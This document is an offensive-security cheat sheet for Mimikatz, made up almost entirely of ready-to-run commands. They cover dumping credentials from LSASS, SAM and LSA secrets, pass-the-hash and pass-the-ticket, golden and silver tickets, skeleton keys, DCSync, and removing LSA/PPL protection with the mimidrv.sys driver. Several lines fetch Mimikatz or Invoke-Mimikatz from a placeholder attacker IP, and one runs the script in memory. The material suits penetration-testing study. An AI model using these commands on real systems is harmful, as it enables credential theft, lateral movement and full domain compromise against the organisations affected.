### **Mimikatz**

### **Commands Without Credentials**

| **Purpose** | **Command Example** |
| --- | --- |
| **Privilege Escalation to SYSTEM** | `privilege::debugtoken::elevate` |
| **Dumping Password Hashes from SAM** | `lsadump::sam` |
| **Dumping Credentials from LSA Secrets** | `lsadump::secrets` |
| **Dumping Domain Cached Credentials (DCC)** | `lsadump::cache` |
| **Retrieve trust authentication information.** | `lsadump::trust` |
| **Dumping Kerberos Tickets** | `sekurlsa::tickets` |
| **Extracts Credentials from LSA** | `lsadump::lsa /inject` |
| **Dumping WDIGEST Credentials** | `sekurlsa::wdigest` |
| **Dumping Clear-Text Credentials** | `sekurlsa::logonpasswords` |
| **Dumping NTLM Hashes from LSASS Memory** | `sekurlsa::msv` |
| **Dumping Kerberos Keys** | `sekurlsa::kerberos` |
| **Dumping SSP Credentials** | `sekurlsa::ssp` |
| **Dumping TSPKG Credentials** | `sekurlsa::tspkg` |
| **Listing Available Privileges** | `privilege::list` |
| **Extracts Passwords from Windows Vault** | `vault::cred /patch` |
| **Dumping Security Account Manager (SAM)** | `lsadump::sam /system:<SYSTEM> /sam:<SAM>` |
| **Dumping Hashes from Active Directory** | `lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>` (requires replication rights, not direct credentials) |

### **Commands That Required Credentials**

| **Purpose** | **Command Example** |
| --- | --- |
| **Pass-the-Hash Attack (PTH)** | `sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>` |
| **Pass-the-Ticket Attack (PTT)** | `kerberos::ptt <ticket.kirbi>` |
| **Over-Pass-The-Hash / Pass-The-Key (Kerberos Ticket)** | `sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<AES256_HASH> /run:<COMMAND>` |
| **Golden Ticket Creation** | `kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /ticket:<OUTPUT_TICKET>` |
| **Silver Ticket Creation** | `kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SERVICE/SERVER> /service:<SERVICE> /rc4:<NTLM_HASH> /id:<USER_RID> /ptt` |
| **Dump Kerberos Tickets for Specific User** | `sekurlsa::tickets /export` |
| **Skeleton Key Injection** | `misc::skeleton` (Injects a skeleton key, allowing login as any user using the password `mimikatz`) |
| **Kerberos Silver Ticket Creation (Advanced)** | `kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_HASH> /service:<SERVICE> /sid:<DOMAIN_SID>` |
| **Over-Pass-the-Hash (with RC4)** | `sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>` |
| **DPAPI Credential Decryption** | `dpapi::cred /in:<CREDENTIAL_FILE>` |
| **Extracting TGT from LSASS Memory** | `kerberos::tgt` |

### **Command One-Liners**

When using tools like `Evil-WinRM` or unstable reverse shells, running `mimikatz` can be problematic. In such cases, **Mimikatz one-liner commands** offer an effective workaround. Here are different approaches:

- (Recommended Option) **Using Mimikatz One-Liners**:

```powershell
.\mimikatz.exe "privilege::debug" "[command]" "exit"

# Example for Dumping Passwords (using cmd.exe or PowerShell)
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"

# Example for Passing the Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH" "exit"

```

- Running Mimikatz with **Command Redirection**: ensures output is saved to a file for later retrieval if the shell disconnects.

```powershell
mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt

```

- Running Mimikatz via **PowerShell Encoded Commands**:

```powershell
$command = "privilege::debug [command] exit"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
echo $encodedCommand

powershell -enc <encodedCommand>

```

- One-Liner with **Remote Execution**:

```powershell
# Evil-WinRM (we need to connect and then execute it, not possible to send it within the same command)
evil-winrm -i [target_ip] -u [username] -p [password]
mimikatz.exe 'privilege::debug' '[command]' 'exit'

# PsExec
impacket-psexec DOMAIN/username:password@target_ip "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# VMIExec
impacket-vmiexec DOMAIN/username:password@target_ip "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# Web Download
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://[attacker_ip]/mimikatz.exe', 'C:\\temp\\mimikatz.exe')"
powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit'"

```

- Using Mimikatz with **Minimal Output**:

```powershell
mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1

```

### **LSA Protection Bypass**

**Theory** Since the release of Mimikatz in 2012, Microsoft introduced defenses like **LSA Protection** and **Credential Guard** to block credential dumping. Starting with Windows 8, processes can run as **Protected Process Light (PPL)**, which prevents even SYSTEM-level processes from reading their memory if PPL is enabled.

For LSASS, this is controlled by the registry key: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`. When enabled, LSASS runs as PPL, and tools like Mimikatz fail to access its memory. By default, this setting is **disabled**for compatibility reasons, but in hardened systems it may already be turned on.

**Bypassing PPL**

PPL is enforced at the **kernel level** (via the EPROCESS object). With **kernel code execution**, LSA protection can be disabled to dump creds.

Mimikatz includes **mimidrv.sys**, a signed driver that can be loaded (requires **Admin/SYSTEM** + `SeLoadDriverPrivilege`) to bypass PPL and access LSASS memory.

**Simple Extracting Credentials**

```powershell
# We must have SYSTEM or local administrator permissions
mimikatz.exe

mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords

```

**Steps to Bypass LSA**

1. Check if LSA Protecting is enabled

```powershell
# 0=disabled, 1=enabled
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

```

1. **Load the `mimidrv.sys` driver**

```powershell
mimikatz # !+

```

1. **Disable the PPL Protection for LSASS**

```powershell
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 536 -> 00/00 [0-0-0]

```

1. **Extract the Credentials**

```powershell
mimikatz # sekurlsa::logonpasswords

```

### **MiniDump**

1. **Compile the MiniDump project**, [GitHub Reference](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/MiniDump), alternative you can use Task Manager if have a GUI to dump this file.
    
    Create MiniDump
    
    ![Create MiniDump](https://www.emmanuelsolis.com/img/14.3.2_minidump.png)
    
2. **Run the tool**

```powershell
MiniDump.exe

```

1. **Run Mimikatz**

```powershell
mimikatz.exe

# lsass.dmp is the dumped file from the previous step
mimikatz # sekurlsa::minidump lsass.dmp

```

1. **Extract the credentials**

```powershell
mimikatz # sekurlsa::logonpasswords

```

### **Kiwi Meterpreter Built In Module**

**Steps**

1. **Load the module** in a current Meterpreter session

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

```

1. **(Optional)** Check the current available options

```bash
meterpreter > help

...

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

```

1. **Extract Credentials**

```bash
meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
....

```

### **Invoke-Mimikatz**

**Steps**

1. Download the code from [GitHub](https://github.com/Extravenger/OSEPlayground/tree/main/10%20-%20Post%20Exploitation/Mimikatz)
2. Start an HTTP Server

```bash
python3 -m http.server 80

```

1. **Download it to the victim and load it directly in memory**

```powershell
iex(New-Object net.webclient).downloadstring('http://[ATTACKER_IP]/Invoke-Mimikatz.ps1')

```

**Disable PPL**

```powershell
Invoke-Mimikatz -Command '"!processprotect /process:lsass.exe /remove"'

```

**All-In-One Command**

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch" "lsadump::sam" "sekurlsa::credman" "sekurlsa::ssp" "sekurlsa::wdigest" "sekurlsa::logonpasswords" "lsadump::secrets"'

```

**Command by Command**

```powershell
# Get passwords of scheduled tasks.
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch"'

# Dump logged-on Accounts hashes.
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Local Accounts Credentials
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'

# Dump LSA secrets
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets"'

# List Kerberos encryption keys
Invoke-Mimikatz -Command '"privilege::debug" sekurlsa::ekeys"'

# List Credentials Manager
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::credman"'

# Lists SSP credentials
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::ssp"'

# List WDigest credentials
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::wdigest"'

```

**DCSync**

```powershell
# Sometimes DC need to be specified too with: /dc:[DOMAIN].com
Invoke-Mimikatz -Command '"lsadump::dcsync /user:NETBIOS\[USER]"'

```

**Golden Ticket**

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

```
